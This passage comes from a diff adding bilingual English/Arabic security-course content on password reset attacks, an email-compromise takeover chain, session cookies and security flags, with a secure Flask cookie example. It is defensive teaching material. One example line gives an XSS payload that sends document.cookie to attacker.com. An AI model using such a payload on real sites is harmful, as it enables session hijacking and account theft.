+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "Token interception is another attack vector that exploits the communication channel. When password reset emails are sent over unencrypted connections or stored insecurely, attackers can intercept them. Man-in-the-middle attacks on public Wi-Fi networks can capture reset emails in transit. Compromised email servers or email relay services can leak reset tokens. Some applications make the mistake of including reset tokens in URL parameters that get logged by web servers, proxy servers, or analytics services. These logs may be accessible to unauthorized parties or leak through misconfigurations. Advanced attackers also exploit browser extensions and malware that monitor email activity and automatically extract password reset links. The lesson is that security must extend beyond the application itself to encompass the entire communication and storage infrastructure.",
+            "ar": "اعتراض الرموز هو ناقل هجوم آخر يستغل قناة الاتصال. عندما يتم إرسال رسائل بريد إلكتروني لإعادة تعيين كلمة المرور عبر اتصالات غير مشفرة أو يتم تخزينها بشكل غير آمن، يمكن للمهاجمين اعتراضها. يمكن لهجمات الرجل في الوسط على شبكات Wi-Fi العامة التقاط رسائل بريد إلكتروني لإعادة التعيين أثناء النقل. يمكن لخوادم البريد الإلكتروني المخترقة أو خدمات ترحيل البريد الإلكتروني تسريب رموز إعادة التعيين. ترتكب بعض التطبيقات خطأ تضمين رموز إعادة التعيين في معلمات URL التي يتم تسجيلها بواسطة خوادم الويب أو خوادم البروكسي أو خدمات التحليلات. قد تكون هذه السجلات متاحة لأطراف غير مصرح لها أو تتسرب من خلال سوء التكوينات. يستغل المهاجمون المتقدمون أيضاً امتدادات المتصفح والبرامج الضارة التي تراقب نشاط البريد الإلكتروني وتستخرج روابط إعادة تعيين كلمة المرور تلقائياً. الدرس هو أن الأمان يجب أن يمتد إلى ما هو أبعد من التطبيق نفسه ليشمل البنية التحتية بأكملها للاتصالات والتخزين."
+          }
+        },
+        {
+          "id": 17,
+          "type": "orderedList",
+          "title": {
+            "en": "Complete Email Compromise Attack Chain Leading to Multiple Account Takeovers",
+            "ar": "سلسلة هجوم اختراق البريد الإلكتروني الكاملة المؤدية إلى الاستيلاء على حسابات متعددة"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Initial Email Compromise",
+                "ar": "اختراق البريد الإلكتروني الأولي"
+              },
+              "text": {
+                "en": "Attacker gains access to victim's email account through phishing, credential stuffing, or exploiting a vulnerability in the email provider. The victim may not immediately notice the compromise.",
+                "ar": "يحصل المهاجم على وصول إلى حساب البريد الإلكتروني للضحية من خلال التصيد أو حشو بيانات الاعتماد أو استغلال ثغرة في مزود البريد الإلكتروني. قد لا يلاحظ الضحية الاختراق فوراً."
+              },
+              "example": {
+                "en": "Example: Victim clicks phishing link mimicking email provider login, unknowingly gives credentials to attacker.",
+                "ar": "مثال: ينقر الضحية على رابط تصيد يحاكي تسجيل دخول مزود البريد الإلكتروني، ويقدم بيانات الاعتماد للمهاجم دون علم."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Reconnaissance and Target Identification",
+                "ar": "الاستطلاع وتحديد الهدف"
+              },
+              "text": {
+                "en": "Attacker searches email inbox for registration confirmations, password reset history, and account statements. This reveals all services the victim uses, including banking, shopping, social media, and work accounts.",
+                "ar": "يبحث المهاجم في صندوق الوارد للبريد الإلكتروني عن تأكيدات التسجيل وسجل إعادة تعيين كلمة المرور وبيانات الحساب. هذا يكشف عن جميع الخدمات التي يستخدمها الضحية، بما في ذلك الخدمات المصرفية والتسوق ووسائل التواصل الاجتماعي وحسابات العمل."
+              },
+              "example": {
+                "en": "Example: Attacker finds emails from bank, PayPal, Amazon, Facebook, and employer's email system.",
+                "ar": "مثال: يجد المهاجم رسائل بريد إلكتروني من البنك و PayPal و Amazon و Facebook ونظام البريد الإلكتروني لصاحب العمل."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Systematic Password Reset Requests",
+                "ar": "طلبات إعادة تعيين كلمة المرور المنهجية"
+              },
+              "text": {
+                "en": "Attacker visits each identified service and initiates password reset. Reset emails arrive in the already-compromised inbox. Attacker clicks reset links and sets new passwords, locking out the legitimate owner.",
+                "ar": "يزور المهاجم كل خدمة محددة ويبدأ إعادة تعيين كلمة المرور. تصل رسائل بريد إلكتروني لإعادة التعيين إلى صندوق الوارد المخترق بالفعل. ينقر المهاجم على روابط إعادة التعيين ويعين كلمات مرور جديدة، مما يقفل المالك الشرعي خارجاً."
+              },
+              "example": {
+                "en": "Example: Within one hour, attacker resets passwords for 10-15 different accounts while victim is unaware.",
+                "ar": "مثال: في غضون ساعة واحدة، يعيد المهاجم تعيين كلمات المرور لـ 10-15 حساباً مختلفاً بينما الضحية غير مدرك."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Email Access Removal",
+                "ar": "إزالة وصول البريد الإلكتروني"
+              },
+              "text": {
+                "en": "To maintain control, attacker changes the email account password itself. They may also update recovery information to their own phone number or backup email. Victim is now completely locked out of primary email.",
+                "ar": "للحفاظ على السيطرة، يغير المهاجم كلمة مرور حساب البريد الإلكتروني نفسها. قد يقومون أيضاً بتحديث معلومات الاسترداد إلى رقم هاتفهم الخاص أو البريد الإلكتروني الاحتياطي. الضحية الآن مقفل تماماً خارج البريد الإلكتروني الأساسي."
+              },
+              "example": {
+                "en": "Example: Victim tries to log into email, discovers password changed, cannot recover because recovery email was also changed.",
+                "ar": "مثال: يحاول الضحية تسجيل الدخول إلى البريد الإلكتروني، يكتشف تغيير كلمة المرور، لا يمكنه الاسترداد لأن البريد الإلكتروني للاسترداد قد تم تغييره أيضاً."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "Exploitation and Damage",
+                "ar": "الاستغلال والضرر"
+              },
+              "text": {
+                "en": "With control of multiple accounts, attacker conducts fraudulent transactions, steals data, impersonates victim to contacts, or sells account access on dark web. Victim faces financial loss, identity theft, and reputational damage.",
+                "ar": "مع السيطرة على حسابات متعددة، يجري المهاجم معاملات احتيالية ويسرق البيانات وينتحل شخصية الضحية لجهات الاتصال أو يبيع الوصول إلى الحساب على الويب المظلم. يواجه الضحية خسارة مالية وسرقة هوية وضرراً في السمعة."
+              },
+              "example": {
+                "en": "Example: Attacker transfers money from bank account, makes purchases with saved credit cards, posts malicious content on social media.",
+                "ar": "مثال: يحول المهاجم الأموال من الحساب المصرفي، ويجري عمليات شراء ببطاقات الائتمان المحفوظة، وينشر محتوى ضاراً على وسائل التواصل الاجتماعي."
+              }
+            }
+          ]
+        },
+        {
+          "id": 18,
+          "type": "list",
+          "title": {
+            "en": "Best Practices for Secure Password Reset Implementation",
+            "ar": "أفضل الممارسات لتنفيذ إعادة تعيين كلمة المرور الآمنة"
+          },
+          "items": {
+            "en": [
+              "Generate tokens using cryptographically secure random number generators with at least 128 bits of entropy",
+              "Set short expiration times for reset tokens, typically 15-60 minutes depending on application sensitivity",
+              "Enforce single-use tokens that are immediately invalidated after the password is changed",
+              "Invalidate all existing tokens when a new reset is requested or password is changed",
+              "Never include tokens in URL parameters that get logged; use POST requests with tokens in request body",
+              "Send password reset emails over encrypted SMTP connections and store them securely",
+              "Avoid security questions entirely; use alternative recovery methods like backup email or trusted phone numbers",
+              "Implement rate limiting on password reset requests to prevent enumeration and abuse",
+              "Do not reveal whether an email address exists in the system; always show the same success message",
+              "Notify users via their registered email when password reset is requested as an early warning system",
+              "Require current password when changing password from authenticated session to detect unauthorized access"
+            ],
+            "ar": [
+              "إنشاء رموز باستخدام مولدات أرقام عشوائية آمنة من الناحية التشفيرية بـ 128 بت من الإنتروبيا على الأقل",
+              "تعيين أوقات انتهاء صلاحية قصيرة لرموز إعادة التعيين، عادةً 15-60 دقيقة حسب حساسية التطبيق",
+              "فرض رموز للاستخدام مرة واحدة يتم إبطالها فوراً بعد تغيير كلمة المرور",
+              "إبطال جميع الرموز الموجودة عند طلب إعادة تعيين جديدة أو تغيير كلمة المرور",
+              "عدم تضمين الرموز في معلمات URL التي يتم تسجيلها؛ استخدام طلبات POST مع الرموز في نص الطلب",
+              "إرسال رسائل بريد إلكتروني لإعادة تعيين كلمة المرور عبر اتصالات SMTP مشفرة وتخزينها بشكل آمن",
+              "تجنب أسئلة الأمان تماماً؛ استخدام طرق استرداد بديلة مثل البريد الإلكتروني الاحتياطي أو أرقام الهواتف الموثوقة",
+              "تنفيذ تقييد المعدل على طلبات إعادة تعيين كلمة المرور لمنع الإحصاء وإساءة الاستخدام",
+              "عدم الكشف عما إذا كان عنوان بريد إلكتروني موجوداً في النظام؛ إظهار نفس رسالة النجاح دائماً",
+              "إخطار المستخدمين عبر بريدهم الإلكتروني المسجل عند طلب إعادة تعيين كلمة المرور كنظام تحذير مبكر",
+              "طلب كلمة المرور الحالية عند تغيير كلمة المرور من جلسة مصادق عليها للكشف عن الوصول غير المصرح به"
+            ]
+          }
+        },
+        {
+          "id": 19,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Treat your primary email account with maximum security. Enable multi-factor authentication, use a strong unique password, and regularly review login activity. Your email is the skeleton key to all your other online accounts.",
+            "ar": "تعامل مع حساب بريدك الإلكتروني الأساسي بأقصى درجات الأمان. قم بتمكين المصادقة متعددة العوامل واستخدم كلمة مرور قوية وفريدة وراجع نشاط تسجيل الدخول بانتظام. بريدك الإلكتروني هو المفتاح الهيكلي لجميع حساباتك الأخرى عبر الإنترنت."
+          },
+          "link": "",
+          "isLab": false
+        }
+      ]
+    },
+    {
+      "id": "topic-6",
+      "title": {
+        "en": "Session Management 101: Cookies, Sessions, and Security Flags",
+        "ar": "إدارة الجلسات 101: ملفات تعريف الارتباط والجلسات وعلامات الأمان"
+      },
+      "elements": [
+        {
+          "id": 1,
+          "type": "title",
+          "value": {
+            "en": "Understanding HTTP Statelessness and Why Sessions Are Needed",
+            "ar": "فهم عدم حالة HTTP ولماذا تكون الجلسات ضرورية"
+          }
+        },
+        {
+          "id": 2,
+          "type": "text",
+          "value": {
+            "en": "The HTTP protocol that powers the web is inherently stateless. This means each request from your browser to a web server is independent and contains no memory of previous requests. When you visit a web page, your browser sends a request to the server. The server responds with the page content, and then completely forgets about you. If you click another link, the server treats you as a completely new visitor with no connection to the previous request. This design makes HTTP simple and scalable, but it creates a problem for applications that need to track users across multiple page views. Without a way to maintain state, the server cannot remember that you logged in, what items are in your shopping cart, or any preferences you set.",
+            "ar": "بروتوكول HTTP الذي يشغل الويب بلا حالة بطبيعته. هذا يعني أن كل طلب من متصفحك إلى خادم ويب مستقل ولا يحتوي على ذاكرة للطلبات السابقة. عندما تزور صفحة ويب، يرسل متصفحك طلباً إلى الخادم. يستجيب الخادم بمحتوى الصفحة، ثم ينساك تماماً. إذا نقرت على رابط آخر، يعاملك الخادم كزائر جديد تماماً بدون اتصال بالطلب السابق. يجعل هذا التصميم HTTP بسيطاً وقابلاً للتوسع، لكنه يخلق مشكلة للتطبيقات التي تحتاج إلى تتبع المستخدمين عبر عروض صفحات متعددة. بدون طريقة للحفاظ على الحالة، لا يمكن للخادم أن يتذكر أنك سجلت الدخول، أو ما هي العناصر الموجودة في عربة التسوق الخاصة بك، أو أي تفضيلات قمت بتعيينها."
+          }
+        },
+        {
+          "id": 3,
+          "type": "text",
+          "value": {
+            "en": "Sessions solve this problem by creating a temporary state that persists across multiple requests. When you log into a website, the server creates a session object that stores information about you: your user ID, authentication status, preferences, and any data needed during your visit. The server assigns this session a unique identifier called a session ID. This session ID is sent to your browser, which stores it and includes it with every subsequent request. When the server receives a request with a session ID, it looks up the corresponding session object and retrieves your information. This allows the server to remember you from one page to the next, creating the illusion of a persistent connection despite HTTP's stateless nature. Sessions are fundamental to how modern web applications work, enabling everything from user logins to shopping carts to personalized experiences.",
+            "ar": "تحل الجلسات هذه المشكلة من خلال إنشاء حالة مؤقتة تستمر عبر طلبات متعددة. عندما تسجل الدخول إلى موقع ويب، ينشئ الخادم كائن جلسة يخزن معلومات عنك: معرف المستخدم الخاص بك وحالة المصادقة والتفضيلات وأي بيانات مطلوبة أثناء زيارتك. يعين الخادم لهذه الجلسة معرفاً فريداً يُسمى معرف الجلسة. يتم إرسال معرف الجلسة هذا إلى متصفحك، الذي يخزنه ويضمنه مع كل طلب لاحق. عندما يستقبل الخادم طلباً بمعرف جلسة، يبحث عن كائن الجلسة المقابل ويسترجع معلوماتك. هذا يسمح للخادم بتذكرك من صفحة إلى أخرى، مما يخلق وهم اتصال دائم على الرغم من طبيعة HTTP بلا حالة. الجلسات أساسية لكيفية عمل تطبيقات الويب الحديثة، مما يتيح كل شيء من تسجيلات الدخول للمستخدمين إلى عربات التسوق إلى التجارب الشخصية."
+          }
+        },
+        {
+          "id": 1772330278461.3489,
+          "type": "image",
+          "srcKey": "",
+          "size": "small",
+          "imageUrl": "https://pub-cb38e65ea6bd411eb827a8641fdcc72d.r2.dev/OWASP%20Top%2010%20-%20Authentication%20%26%20Authorization/HTTP%20stateless%20nature.webp"
+        },
+        {
+          "id": 5,
+          "type": "note",
+          "noteType": "info",
+          "value": {
+            "en": "Sessions exist on the server side and are separate from cookies. Cookies are simply the transport mechanism that carries the session ID between browser and server. Understanding this distinction is crucial for implementing secure session management.",
+            "ar": "توجد الجلسات على جانب الخادم وهي منفصلة عن ملفات تعريف الارتباط. ملفات تعريف الارتباط هي ببساطة آلية النقل التي تحمل معرف الجلسة بين المتصفح والخادم. فهم هذا التمييز أمر بالغ الأهمية لتنفيذ إدارة جلسات آمنة."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 6,
+          "type": "hr"
+        },
+        {
+          "id": 7,
+          "type": "title",
+          "value": {
+            "en": "Cookies: The Mechanism for Storing Session IDs",
+            "ar": "ملفات تعريف الارتباط: آلية تخزين معرفات الجلسة"
+          }
+        },
+        {
+          "id": 8,
+          "type": "text",
+          "value": {
+            "en": "Cookies are small pieces of data that web servers send to browsers, which store them and send them back with future requests. Think of a cookie as a claim ticket you receive when checking your coat at a restaurant. The ticket has a number on it, and when you return, you present the ticket to retrieve your coat. Cookies work similarly: the server gives your browser a session ID cookie, your browser stores it, and presents it with each request so the server can retrieve your session data. Cookies are stored as key-value pairs. A session cookie might look like sessionId=a7b9c3d5e8f2g4h6. The browser automatically includes all relevant cookies with every HTTP request to the same domain, making the process transparent to users.",
+            "ar": "ملفات تعريف الارتباط هي قطع صغيرة من البيانات ترسلها خوادم الويب إلى المتصفحات، والتي تخزنها وترسلها مرة أخرى مع الطلبات المستقبلية. فكّر في ملف تعريف الارتباط كتذكرة مطالبة تتلقاها عند إيداع معطفك في مطعم. تحتوي التذكرة على رقم، وعندما تعود، تقدم التذكرة لاسترداد معطفك. تعمل ملفات تعريف الارتباط بشكل مماثل: يعطي الخادم متصفحك ملف تعريف ارتباط معرف جلسة، يخزنه متصفحك، ويقدمه مع كل طلب حتى يتمكن الخادم من استرداد بيانات جلستك. يتم تخزين ملفات تعريف الارتباط كأزواج مفتاح-قيمة. قد يبدو ملف تعريف ارتباط الجلسة مثل sessionId=a7b9c3d5e8f2g4h6. يضمن المتصفح تلقائياً جميع ملفات تعريف الارتباط ذات الصلة مع كل طلب HTTP إلى نفس النطاق، مما يجعل العملية شفافة للمستخدمين."
+          }
+        },
+        {
+          "id": 9,
+          "type": "text",
+          "value": {
+            "en": "There are two main types of cookies: session cookies and persistent cookies. Session cookies exist only in browser memory and are deleted when you close the browser. They have no expiration date set by the server. Persistent cookies are saved to disk and survive browser restarts. They have an explicit expiration date that can be hours, days, months, or years in the future. For authentication purposes, session cookies are generally preferred because they provide automatic logout when the user closes their browser. However, many websites use persistent cookies for convenience, allowing users to stay logged in across browser sessions. This trade-off between security and usability must be carefully considered. Sensitive applications like banking should always use short-lived session cookies, while less critical applications might use persistent cookies with reasonable expiration times.",
+            "ar": "هناك نوعان رئيسيان من ملفات تعريف الارتباط: ملفات تعريف ارتباط الجلسة وملفات تعريف الارتباط الدائمة. توجد ملفات تعريف ارتباط الجلسة فقط في ذاكرة المتصفح ويتم حذفها عند إغلاق المتصفح. ليس لديها تاريخ انتهاء صلاحية محدد من قبل الخادم. يتم حفظ ملفات تعريف الارتباط الدائمة على القرص وتبقى بعد إعادة تشغيل المتصفح. لديها تاريخ انتهاء صلاحية صريح يمكن أن يكون ساعات أو أيام أو أشهر أو سنوات في المستقبل. لأغراض المصادقة، يُفضل عموماً استخدام ملفات تعريف ارتباط الجلسة لأنها توفر تسجيل خروج تلقائي عند إغلاق المستخدم للمتصفح. ومع ذلك، تستخدم العديد من المواقع ملفات تعريف ارتباط دائمة للراحة، مما يسمح للمستخدمين بالبقاء مسجلين الدخول عبر جلسات المتصفح. يجب النظر بعناية في هذه المقايضة بين الأمان وسهولة الاستخدام. يجب على التطبيقات الحساسة مثل الخدمات المصرفية استخدام ملفات تعريف ارتباط جلسة قصيرة العمر دائماً، بينما قد تستخدم التطبيقات الأقل أهمية ملفات تعريف ارتباط دائمة بأوقات انتهاء صلاحية معقولة."
+          }
+        },
+        {
+          "id": 10,
+          "type": "table",
+          "title": {
+            "en": "Cookie Attributes and Their Security Implications",
+            "ar": "سمات ملف تعريف الارتباط وآثارها الأمنية"
+          },
+          "headers": {
+            "en": [
+              "Cookie Attribute",
+              "Purpose",
+              "Security Benefit",
+              "Recommendation"
+            ],
+            "ar": [
+              "سمة ملف تعريف الارتباط",
+              "الغرض",
+              "الفائدة الأمنية",
+              "التوصية"
+            ]
+          },
+          "rows": [
+            {
+              "en": [
+                "Secure",
+                "Cookie only sent over HTTPS connections",
+                "Prevents interception on unencrypted HTTP",
+                "Always use for session cookies"
+              ],
+              "ar": [
+                "Secure",
+                "يتم إرسال ملف تعريف الارتباط فقط عبر اتصالات HTTPS",
+                "يمنع الاعتراض على HTTP غير المشفر",
+                "استخدم دائماً لملفات تعريف ارتباط الجلسة"
+              ]
+            },
+            {
+              "en": [
+                "HttpOnly",
+                "Cookie cannot be accessed by JavaScript",
+                "Prevents theft via XSS attacks",
+                "Always use for session cookies"
+              ],
+              "ar": [
+                "HttpOnly",
+                "لا يمكن الوصول إلى ملف تعريف الارتباط بواسطة JavaScript",
+                "يمنع السرقة عبر هجمات XSS",
+                "استخدم دائماً لملفات تعريف ارتباط الجلسة"
+              ]
+            },
+            {
+              "en": [
+                "SameSite",
+                "Controls whether cookie sent with cross-site requests",
+                "Prevents CSRF attacks",
+                "Use Strict or Lax for session cookies"
+              ],
+              "ar": [
+                "SameSite",
+                "يتحكم فيما إذا كان يتم إرسال ملف تعريف الارتباط مع طلبات عبر المواقع",
+                "يمنع هجمات CSRF",
+                "استخدم Strict أو Lax لملفات تعريف ارتباط الجلسة"
+              ]
+            },
+            {
+              "en": [
+                "Domain",
+                "Specifies which domains can receive the cookie",
+                "Limits cookie scope to prevent leakage",
+                "Set to specific domain, avoid wildcards"
+              ],
+              "ar": [
+                "Domain",
+                "يحدد النطاقات التي يمكنها استقبال ملف تعريف الارتباط",
+                "يحد من نطاق ملف تعريف الارتباط لمنع التسرب",
+                "تعيين إلى نطاق محدد، تجنب أحرف البدل"
+              ]
+            },
+            {
+              "en": [
+                "Path",
+                "Restricts cookie to specific URL paths",
+                "Limits cookie visibility within application",
+                "Use most specific path possible"
+              ],
+              "ar": [
+                "Path",
+                "يقيد ملف تعريف الارتباط على مسارات URL محددة",
+                "يحد من رؤية ملف تعريف الارتباط داخل التطبيق",
+                "استخدم أكثر مسار محدد ممكن"
+              ]
+            },
+            {
+              "en": [
+                "Expires / Max-Age",
+                "When cookie should be deleted",
+                "Limits lifetime of session if compromised",
+                "Short duration for sensitive applications"
+              ],
+              "ar": [
+                "Expires / Max-Age",
+                "متى يجب حذف ملف تعريف الارتباط",
+                "يحد من عمر الجلسة إذا تم اختراقها",
+                "مدة قصيرة للتطبيقات الحساسة"
+              ]
+            }
+          ]
+        },
+        {
+          "id": 11,
+          "type": "code",
+          "language": "python",
+          "value": "# Example: Setting a secure session cookie in Python Flask\nfrom flask import Flask, session, make_response\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)  # Strong secret key\n\n@app.route('/login', methods=['POST'])\ndef login():\n    # After successful authentication\n    user_id = authenticate_user()  # Your authentication logic\n    \n    # Create session\n    session['user_id'] = user_id\n    session['authenticated'] = True\n    \n    # Create response\n    response = make_response('Login successful')\n    \n    # Set secure cookie attributes\n    response.set_cookie(\n        'session_id',\n        value=secrets.token_urlsafe(32),  # Cryptographically secure random token\n        secure=True,        # Only sent over HTTPS\n        httponly=True,      # Not accessible to JavaScript\n        samesite='Strict',  # Prevents CSRF\n        max_age=3600        # Expires in 1 hour\n    )\n    \n    return response\n\n# Flask automatically handles session management with these security flags\n# when properly configured"
+        },
+        {
+          "id": 12,
+          "type": "note",
+          "noteType": "warning",
+          "value": {
+            "en": "Missing Secure and HttpOnly flags on session cookies is one of the most common and dangerous session management mistakes. These flags must be set for all session cookies without exception.",
+            "ar": "فقدان علامات Secure و HttpOnly على ملفات تعريف ارتباط الجلسة هو أحد أخطاء إدارة الجلسات الأكثر شيوعاً وخطورة. يجب تعيين هذه العلامات لجميع ملفات تعريف ارتباط الجلسة دون استثناء."
+          },
+          "link": "",
+          "isLab": false
+        },
+        {
+          "id": 13,
+          "type": "hr"
+        },
+        {
+          "id": 14,
+          "type": "title",
+          "value": {
+            "en": "Critical Security Flags: Secure, HttpOnly, and SameSite Explained",
+            "ar": "علامات الأمان الحرجة: شرح Secure و HttpOnly و SameSite"
+          }
+        },
+        {
+          "id": 15,
+          "type": "text",
+          "value": {
+            "en": "The Secure flag is the most fundamental protection for session cookies. When set, this flag instructs the browser to only transmit the cookie over encrypted HTTPS connections. Without the Secure flag, cookies are sent over both HTTPS and HTTP. This creates a vulnerability where an attacker performing a man-in-the-middle attack on an unencrypted connection can intercept session cookies. Even if a website uses HTTPS by default, a single link to an HTTP version of the site or a single unencrypted resource loaded on the page can leak the session cookie. The Secure flag provides absolute protection against this entire class of attacks by ensuring session cookies never travel over unencrypted channels. Every session cookie must have the Secure flag set, and applications must enforce HTTPS for all pages and resources.",
+            "ar": "علامة Secure هي الحماية الأساسية الأكثر أهمية لملفات تعريف ارتباط الجلسة. عند التعيين، تطلب هذه العلامة من المتصفح نقل ملف تعريف الارتباط فقط عبر اتصالات HTTPS مشفرة. بدون علامة Secure، يتم إرسال ملفات تعريف الارتباط عبر HTTPS و HTTP. هذا يخلق ثغرة حيث يمكن للمهاجم الذي يقوم بهجوم رجل في الوسط على اتصال غير مشفر اعتراض ملفات تعريف ارتباط الجلسة. حتى لو كان موقع ويب يستخدم HTTPS بشكل افتراضي، فإن رابطاً واحداً إلى إصدار HTTP من الموقع أو مورداً واحداً غير مشفر محملاً على الصفحة يمكن أن يتسرب ملف تعريف ارتباط الجلسة. توفر علامة Secure حماية مطلقة ضد هذه الفئة بأكملها من الهجمات من خلال ضمان عدم انتقال ملفات تعريف ارتباط الجلسة أبداً عبر قنوات غير مشفرة. يجب أن تحتوي كل ملف تعريف ارتباط جلسة على علامة Secure مضبوطة، ويجب على التطبيقات فرض HTTPS لجميع الصفحات والموارد."
+          }
+        },
+        {
+          "id": 16,
+          "type": "text",
+          "value": {
+            "en": "The HttpOnly flag prevents JavaScript code from accessing cookies. Normally, JavaScript running on a web page can read and modify cookies using document.cookie. This becomes a security problem when an attacker injects malicious JavaScript into a page through a cross-site scripting (XSS) vulnerability. The injected code can steal session cookies and send them to the attacker's server. The HttpOnly flag completely blocks JavaScript access to cookies, making them invisible to document.cookie. Even if an attacker successfully injects malicious scripts, they cannot steal HttpOnly session cookies. This defense-in-depth approach means that even if XSS vulnerabilities exist in the application, session hijacking through cookie theft is prevented. HttpOnly should be set on all session cookies and any cookies containing sensitive data.",
+            "ar": "تمنع علامة HttpOnly رمز JavaScript من الوصول إلى ملفات تعريف الارتباط. عادةً، يمكن لـ JavaScript الذي يعمل على صفحة ويب قراءة وتعديل ملفات تعريف الارتباط باستخدام document.cookie. يصبح هذا مشكلة أمنية عندما يحقن مهاجم JavaScript ضار في صفحة من خلال ثغرة البرمجة النصية عبر المواقع (XSS). يمكن للرمز المحقون سرقة ملفات تعريف ارتباط الجلسة وإرسالها إلى خادم المهاجم. تمنع علامة HttpOnly تماماً وصول JavaScript إلى ملفات تعريف الارتباط، مما يجعلها غير مرئية لـ document.cookie. حتى لو نجح مهاجم في حقن نصوص ضارة، فلا يمكنه سرقة ملفات تعريف ارتباط جلسة HttpOnly. يعني نهج الدفاع في العمق هذا أنه حتى لو كانت ثغرات XSS موجودة في التطبيق، يتم منع اختطاف الجلسة من خلال سرقة ملفات تعريف الارتباط. يجب تعيين HttpOnly على جميع ملفات تعريف ارتباط الجلسة وأي ملفات تعريف ارتباط تحتوي على بيانات حساسة."
+          }
+        },
+        {
+          "id": 17,
+          "type": "text",
+          "value": {
+            "en": "The SameSite flag controls when cookies are sent with cross-site requests. Cross-site requests occur when one website makes a request to another website. For example, if you visit attacker.com and it contains an image tag pointing to bank.com, your browser makes a cross-site request to bank.com. Without SameSite protection, the browser automatically includes your bank.com session cookie with this request. This enables Cross-Site Request Forgery (CSRF) attacks where attackers trick your browser into performing actions on websites where you are authenticated. The SameSite flag has three values: Strict, Lax, and None. Strict prevents the cookie from being sent with any cross-site request, providing maximum protection. Lax allows the cookie with safe cross-site navigation like clicking a link, but not with POST requests or images. None allows all cross-site requests but requires the Secure flag. For session cookies, Strict or Lax should be used depending on the application's functionality requirements.",
+            "ar": "تتحكم علامة SameSite فيما إذا كان يتم إرسال ملفات تعريف الارتباط مع طلبات عبر المواقع. تحدث الطلبات عبر المواقع عندما يقوم موقع ويب واحد بطلب إلى موقع ويب آخر. على سبيل المثال، إذا زرت attacker.com وكان يحتوي على علامة صورة تشير إلى bank.com، يقوم متصفحك بطلب عبر المواقع إلى bank.com. بدون حماية SameSite، يضمن المتصفح تلقائياً ملف تعريف ارتباط جلسة bank.com الخاص بك مع هذا الطلب. هذا يتيح هجمات التزوير عبر المواقع (CSRF) حيث يخدع المهاجمون متصفحك لتنفيذ إجراءات على مواقع ويب حيث تكون مصادقاً. لعلامة SameSite ثلاث قيم: Strict و Lax و None. يمنع Strict إرسال ملف تعريف الارتباط مع أي طلب عبر المواقع، مما يوفر أقصى حماية. يسمح Lax بملف تعريف الارتباط مع التنقل الآمن عبر المواقع مثل النقر على رابط، ولكن ليس مع طلبات POST أو الصور. يسمح None بجميع الطلبات عبر المواقع ولكن يتطلب علامة Secure. بالنسبة لملفات تعريف ارتباط الجلسة، يجب استخدام Strict أو Lax اعتماداً على متطلبات وظائف التطبيق."
+          }
+        },
+        {
+          "id": 18,
+          "type": "orderedList",
+          "title": {
+            "en": "How Security Flags Prevent Common Session Attacks",
+            "ar": "كيف تمنع علامات الأمان هجمات الجلسة الشائعة"
+          },
+          "items": [
+            {
+              "subtitle": {
+                "en": "Secure Flag Prevents Network Interception",
+                "ar": "علامة Secure تمنع اعتراض الشبكة"
+              },
+              "text": {
+                "en": "Without Secure flag, session cookie can be intercepted over unencrypted HTTP connections. Attacker on same Wi-Fi network uses packet sniffer to capture all HTTP traffic including cookies. With Secure flag, browser refuses to send cookie over HTTP, forcing all transmission over encrypted HTTPS where packet sniffing cannot read the contents.",
+                "ar": "بدون علامة Secure، يمكن اعتراض ملف تعريف ارتباط الجلسة عبر اتصالات HTTP غير مشفرة. يستخدم المهاجم على نفس شبكة Wi-Fi أداة استنشاق حزم لالتقاط جميع حركة HTTP بما في ذلك ملفات تعريف الارتباط. مع علامة Secure، يرفض المتصفح إرسال ملف تعريف الارتباط عبر HTTP، مما يجبر جميع الإرسال عبر HTTPS المشفر حيث لا يمكن لاستنشاق الحزم قراءة المحتويات."
+              },
+              "example": {
+                "en": "Example: User connects to public Wi-Fi at airport. Attacker running Wireshark can see all HTTP cookies but cannot read HTTPS traffic containing Secure cookies.",
+                "ar": "مثال: يتصل المستخدم بشبكة Wi-Fi عامة في المطار. يمكن للمهاجم الذي يشغل Wireshark رؤية جميع ملفات تعريف ارتباط HTTP ولكن لا يمكنه قراءة حركة HTTPS التي تحتوي على ملفات تعريف ارتباط Secure."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "HttpOnly Flag Prevents XSS Cookie Theft",
+                "ar": "علامة HttpOnly تمنع سرقة ملفات تعريف الارتباط عبر XSS"
+              },
+              "text": {
+                "en": "Without HttpOnly, malicious JavaScript injected through XSS vulnerability can access document.cookie and steal session ID. Attacker receives stolen cookie and uses it to impersonate victim. With HttpOnly flag, JavaScript cannot access the cookie at all, making theft through XSS impossible even if injection vulnerabilities exist.",
+                "ar": "بدون HttpOnly، يمكن لـ JavaScript الضار المحقون من خلال ثغرة XSS الوصول إلى document.cookie وسرقة معرف الجلسة. يتلقى المهاجم ملف تعريف ارتباط مسروق ويستخدمه لانتحال شخصية الضحية. مع علامة HttpOnly، لا يمكن لـ JavaScript الوصول إلى ملف تعريف الارتباط على الإطلاق، مما يجعل السرقة من خلال XSS مستحيلة حتى لو كانت ثغرات الحقن موجودة."
+              },
+              "example": {
+                "en": "Example: Attacker injects <script>fetch('attacker.com/?cookie='+document.cookie)</script>. With HttpOnly, session cookie is not included in document.cookie.",
+                "ar": "مثال: يحقن المهاجم <script>fetch('attacker.com/?cookie='+document.cookie)</script>. مع HttpOnly، لا يتم تضمين ملف تعريف ارتباط الجلسة في document.cookie."
+              }
+            },
+            {
+              "subtitle": {
+                "en": "SameSite Strict Prevents CSRF Attacks",
+                "ar": "SameSite Strict يمنع هجمات CSRF"
+              },
+              "text": {
+                "en": "Without SameSite, cookies are automatically sent with requests from any site, enabling CSRF. Attacker creates malicious page with form that posts to victim's bank. When victim visits attacker's page while logged into bank, browser sends bank session cookie with the forged request. With SameSite=Strict, browser refuses to send cookie with cross-site requests, preventing CSRF entirely.",
